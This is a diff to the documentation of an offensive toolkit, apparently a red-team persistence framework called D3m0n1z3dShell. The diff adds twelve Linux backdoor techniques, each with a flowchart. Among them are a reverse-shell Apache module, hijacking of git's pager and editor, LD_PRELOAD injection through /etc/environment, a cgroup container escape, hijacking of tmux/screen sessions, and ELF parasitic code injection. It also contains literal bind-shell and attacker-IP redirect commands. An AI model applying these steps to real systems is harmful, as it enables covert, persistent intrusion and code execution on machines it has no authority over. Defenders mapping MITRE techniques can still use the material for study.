@@ -1,6 +1,6 @@
 # D3m0n1z3dShell — Technical Documentation
 
-> Complete technical documentation for all 102 techniques with detailed flowcharts showing every syscall, file write, and decision branch.
+> Complete technical documentation for all 114 techniques with detailed flowcharts showing every syscall, file write, and decision branch.
 
 ---
 
@@ -97,6 +97,19 @@
     - [80 — IGEL OS Persistence](#80--igel-os-persistence)
     - [81 — WSL Startup Folder Persistence](#81--wsl-startup-folder-persistence)
     - [82 — Periodic/Anacron Persistence](#82--periodicanacron-persistence)
+  - [13. Malware-Sourced Techniques](#13-malware-sourced-techniques)
+    - [83 — Apache/Nginx Module Backdoor](#83--apachenginx-module-backdoor)
+    - [84 — Git Config Pager Hijack](#84--git-config-pager-hijack)
+    - [85 — /etc/profile.d Script Drop](#85--etcprofiled-script-drop)
+    - [86 — OpenVPN Config Backdoor](#86--openvpn-config-backdoor)
+    - [87 — iptables NAT Redirect](#87--iptables-nat-redirect)
+    - [88 — Tmpfiles.d Persistence](#88--tmpfilesd-persistence)
+    - [89 — /etc/environment Injection](#89--etcenvironment-injection)
+    - [90 — GNOME Shell Extension](#90--gnome-shell-extension)
+    - [91 — network-scripts ifup Backdoor](#91--network-scripts-ifup-backdoor)
+    - [92 — Cgroup Release Agent Escape](#92--cgroup-release-agent-escape)
+    - [93 — Screen/Tmux Session Hijack](#93--screentmux-session-hijack)
+    - [94 — ELF Parasitic Code Injection](#94--elf-parasitic-code-injection)
 - **Windows Techniques**
   - [9. Windows Persistence Generator](#9-windows-persistence-generator)
   - [10. Windows Defense Evasion Generator](#10-windows-defense-evasion-generator)
@@ -2845,6 +2858,273 @@ flowchart TD
 
 ---
 
-> **Total: 102 techniques documented** — 78 Linux + 24 Windows sub-techniques  
-> **Diagrams: 108+ Mermaid flowcharts**, sequence diagrams, and state diagrams  
+## 13. Malware-Sourced Techniques
+
+> Techniques derived from real-world APT malware, threat intelligence research, and red team tooling. Each preserves original binary/service functionality while executing a covert payload.
+
+---
+
+#### 83 — Apache/Nginx Module Backdoor
+
+> **Script:** `scripts/apache_backdoor.sh` | **MITRE:** T1505.003
+
+```mermaid
+flowchart TD
+    A["apache_backdoor.sh"] --> B{"Detect web server"}
+    B -->|Apache| C["Locate apxs/apxs2 compiler"]
+    B -->|Nginx| D["Write lua config to conf.d/"]
+    C --> E["Write mod_d3m0n.c:\nap_hook_child_init registers\nfork() + revshell loop"]
+    E --> F["apxs -c mod_d3m0n.c\n→ .libs/mod_d3m0n.so"]
+    F --> G["apxs -i -a -n d3m0n *.so\nAdds LoadModule directive"]
+    G --> H["Activate on apache restart"]
+    D --> I["Nginx: init_by_lua_block\nluasocket connect + exec"]
+    I --> J["nginx -s reload to activate"]
+    H --> K["Worker child init fires payload\nper worker process lifecycle"]
+
+    style A fill:#cc3333,color:#fff
+    style K fill:#44aa44,color:#fff
+```
+
+---
+
+#### 84 — Git Config Pager Hijack
+
+> **Script:** `scripts/git_config_backdoor.sh` | **MITRE:** T1546
+
+```mermaid
+flowchart TD
+    A["git_config_backdoor.sh"] --> B{"Scope"}
+    B -->|User| C["Write ~/.local/share/.git-helper\nwrapper: revshell + pass-thru"]
+    B -->|System| D["Write /usr/local/share/.git-helper"]
+    C --> E["git config --global core.pager\n= ~/.local/share/.git-helper"]
+    D --> F["git config --system core.pager\n= /usr/local/share/.git-helper"]
+    E --> G["Fires on: git log, git diff,\ngit show, git blame"]
+    F --> G
+    B -->|Editor| H["core.editor hijack\nFires on: git commit, git rebase -i"]
+
+    style A fill:#cc3333,color:#fff
+    style G fill:#44aa44,color:#fff
+    style H fill:#44aa44,color:#fff
+```
+
+---
+
+#### 85 — /etc/profile.d Script Drop
+
+> **Script:** `scripts/profiled_persist.sh` | **MITRE:** T1546.004
+
+```mermaid
+flowchart TD
+    A["profiled_persist.sh"] --> B["Write 99-sysconfig-helper.sh\nto /etc/profile.d/"]
+    B --> C{"Mode"}
+    C -->|Once per boot| D["Check lockfile /tmp/.sc_lock\nCreate on first run"]
+    C -->|Every login| E["No lockfile — fires each\ninteractive login"]
+    C -->|Stealth| F["Target specific user only\nvia $USER check"]
+    D --> G["Fire revshell in background"]
+    E --> G
+    F --> G
+    G --> H["Sourced by: bash, sh,\nzsh, ksh — ALL login shells\nSystem-wide coverage"]
+
+    style A fill:#cc3333,color:#fff
+    style H fill:#44aa44,color:#fff
+```
+
+---
+
+#### 86 — OpenVPN Config Backdoor
+
+> **Script:** `scripts/openvpn_backdoor.sh` | **MITRE:** T1546
+
+```mermaid
+flowchart TD
+    A["openvpn_backdoor.sh"] --> B{"Target"}
+    B -->|Specific .ovpn| C["Backup → inject:\nscript-security 2\nup /path/to/helper"]
+    B -->|All system configs| D["Find /etc/openvpn/*.conf\nInject into each"]
+    B -->|Create malicious| E["Generate .ovpn file\nwith inline up hook"]
+    C --> F["Write helper script:\nnohup revshell + exit 0"]
+    D --> F
+    E --> F
+    F --> G["Fires when VPN tunnel\nestablishes connection\n(openvpn --config ...)"]
+
+    style A fill:#cc3333,color:#fff
+    style G fill:#44aa44,color:#fff
+```
+
+---
+
+#### 87 — iptables NAT Redirect
+
+> **Script:** `scripts/iptables_redirect.sh` | **MITRE:** T1205
+
+```mermaid
+flowchart TD
+    A["iptables_redirect.sh"] --> B{"Method"}
+    B -->|Source-IP redirect| C["iptables -t nat -A PREROUTING\n-s ATTACKER_IP --dport 443\n-j REDIRECT --to-port BSPORT"]
+    B -->|Start bindshell| D["nc -lvp BSPORT -e /bin/bash\nBackground loop"]
+    B -->|Persist| E["iptables-save\n→ /etc/iptables/rules.v4"]
+    C --> F["Only traffic from attacker IP\nis redirected — stealth\nall others reach real service"]
+    D --> F
+    E --> G["Rules survive reboot\nvia iptables-restore"]
+    F --> H["BPFDoor APT technique:\nhidden channel behind\nlegitimate port"]
+
+    style A fill:#cc3333,color:#fff
+    style H fill:#44aa44,color:#fff
+```
+
+---
+
+#### 88 — Tmpfiles.d Persistence
+
+> **Script:** `scripts/tmpfilesd_persist.sh` | **MITRE:** T1543.002
+
+```mermaid
+flowchart TD
+    A["tmpfilesd_persist.sh"] --> B["Write /etc/tmpfiles.d/\n10-d3m0n_tmpfiles.conf"]
+    B --> C{"Type entry"}
+    C -->|SUID bash| D["'f /bin/bash2 0755 root root'\n→ copy bash + chmod u+s"]
+    C -->|Service| E["Write .service unit\nsystemctl enable --now"]
+    C -->|Custom file| F["'f /path 0755 root root'\n→ write payload script"]
+    C -->|Symlink| G["'L /link - - - - /target'\n→ symlink created at boot"]
+    D --> H["systemd-tmpfiles --create\nruns at every boot\nRecreates entry if deleted"]
+    E --> H
+    F --> H
+    G --> H
+
+    style A fill:#cc3333,color:#fff
+    style H fill:#44aa44,color:#fff
+```
+
+---
+
+#### 89 — /etc/environment Injection
+
+> **Script:** `scripts/environment_inject.sh` | **MITRE:** T1574.006
+
+```mermaid
+flowchart TD
+    A["environment_inject.sh"] --> B["Compile inject.c:\n__attribute__((constructor))\nfork() + execl revshell"]
+    B --> C["gcc -shared -fPIC -nostartfiles\n→ /usr/local/lib/libsyshelper.so.1"]
+    C --> D["Append to /etc/environment:\nLD_PRELOAD=/usr/local/lib/libsyshelper.so.1"]
+    D --> E["PAM pam_env reads /etc/environment\nbefore shell profile — early load"]
+    E --> F["Constructor fires on\nany dynamically-linked binary\nloaded by PAM session"]
+    F --> G["Payload: fork + revshell\nD3M0N_LOADED guard prevents\ndouble-execution"]
+
+    style A fill:#cc3333,color:#fff
+    style G fill:#44aa44,color:#fff
+```
+
+---
+
+#### 90 — GNOME Shell Extension
+
+> **Script:** `scripts/gnome_extension.sh` | **MITRE:** T1546
+
+```mermaid
+flowchart TD
+    A["gnome_extension.sh"] --> B["Create extension dir:\n~/.local/share/gnome-shell/\nextensions/system-monitor-helper@..."]
+    B --> C["Write metadata.json:\nname, uuid, shell-version"]
+    C --> D["Write extension.js:\nGLib.timeout_add_seconds(5,...)\nspawn_command_line_async(revshell)"]
+    D --> E["gnome-extensions enable UUID\nvia dconf / D-Bus"]
+    E --> F["Fires every 5 minutes\nafter desktop login\nGLib.SOURCE_CONTINUE loop"]
+    A --> G{"Fallback"}
+    G --> H["~/.config/autostart/\n.d3m0n.desktop\nXDG autostart for non-GNOME DE"]
+
+    style A fill:#cc3333,color:#fff
+    style F fill:#44aa44,color:#fff
+    style H fill:#44aa44,color:#fff
+```
+
+---
+
+#### 91 — network-scripts ifup Backdoor
+
+> **Script:** `scripts/network_scripts.sh` | **MITRE:** T1546
+
+```mermaid
+flowchart TD
+    A["network_scripts.sh"] --> B{"Target"}
+    B -->|CentOS/RHEL ifcfg| C["Backup ifcfg-eth0\nAppend DHCP_HOSTNAME=$(helper)"]
+    B -->|/sbin/ifup-local| D["Write global hook:\nfires for ALL interfaces"]
+    B -->|Debian if-up.d| E["Write /etc/network/if-up.d/\nd3m0n_ifcfg script"]
+    C --> F["Helper script: revshell\nFires on: ifup eth0\nnetwork restart"]
+    D --> F
+    E --> F
+    F --> G["Executed as root by\nnetwork-scripts or ifupdown\nwhen interface comes up"]
+
+    style A fill:#cc3333,color:#fff
+    style G fill:#44aa44,color:#fff
+```
+
+---
+
+#### 92 — Cgroup Release Agent Escape
+
+> **Script:** `scripts/cgroup_escape.sh` | **MITRE:** T1611
+
+```mermaid
+flowchart TD
+    A["cgroup_escape.sh"] --> B{"Environment"}
+    B -->|Inside container| C["Mount cgroupv1 memory\nCreate child cgroup"]
+    B -->|Host direct| D["Create test cgroup\nSet release_agent path"]
+    C --> E["Write payload to tempfile\necho tempfile > release_agent\necho 1 > notify_on_release"]
+    E --> F["Fork process into child cgroup\nWait → process exits cgroup"]
+    F --> G["cgroupv1 kernel calls\nrelease_agent ON THE HOST\nEscape achieved"]
+    B -->|cgroupv2 fallback| H["nsenter -t 1 -m -u -i -n -p\n-- /bin/bash -c 'revshell'"]
+    G --> I["Payload executes with\nhost kernel privileges\nOutside container namespace"]
+
+    style A fill:#cc3333,color:#fff
+    style G fill:#44aa44,color:#fff
+    style I fill:#44aa44,color:#fff
+```
+
+---
+
+#### 93 — Screen/Tmux Session Hijack
+
+> **Script:** `scripts/screen_hijack.sh` | **MITRE:** T1563.001
+
+```mermaid
+flowchart TD
+    A["screen_hijack.sh"] --> B{"Method"}
+    B -->|screen inject| C["screen -S SESSION -X stuff\n'command\\n'\nInjects keystrokes"]
+    B -->|tmux inject| D["tmux -S /tmp/.tmux-*/sock\nsend-keys -t 0 'command' Enter"]
+    B -->|Widen perms| E["chmod 777 socket_dir\nAllows our user to attach"]
+    B -->|Shared session| F["tmux -S /tmp/.d3m0n.sock\nnew-session -d -s name"]
+    C --> G["Command executes in victim's\ninteractive session as their user"]
+    D --> G
+    E --> H["screen -x SESSION\nor tmux attach-session"]
+    F --> I["Persistent socket: attacker\ncan attach anytime"]
+
+    style A fill:#cc3333,color:#fff
+    style G fill:#44aa44,color:#fff
+    style I fill:#44aa44,color:#fff
+```
+
+---
+
+#### 94 — ELF Parasitic Code Injection
+
+> **Script:** `scripts/elf_inject.sh` | **MITRE:** T1554
+
+```mermaid
+flowchart TD
+    A["elf_inject.sh"] --> B{"Method"}
+    B -->|PT_NOTE injection| C["Read ELF64 program headers\nFind PT_NOTE segment"]
+    C --> D["Append shellcode to end of file\nNOP sled + fork stub + NOP sled"]
+    D --> E["Overwrite PT_NOTE header:\np_type=PT_LOAD, p_flags=RWX\np_offset→injected code"]
+    E --> F["Redirect e_entry in ELF header\nto shellcode vaddr"]
+    F --> G["On execution: shellcode runs\nfork() → child fires payload\nparent continues to real entry"]
+    B -->|Script wrapper| H["mv binary → binary.real\nWrite bash wrapper:\nrevshell + exec binary.real"]
+    G --> I["Original binary executes\nnormally after fork —\ntransparent to user"]
+    H --> I
+
+    style A fill:#cc3333,color:#fff
+    style G fill:#44aa44,color:#fff
+    style I fill:#44aa44,color:#fff
+```
+
+---
+
+> **Total: 114 techniques documented** — 90 Linux + 24 Windows sub-techniques  
+> **Diagrams: 120+ Mermaid flowcharts**, sequence diagrams, and state diagrams  
 > **Coverage: Complete MITRE ATT&CK mapping** across all tactics
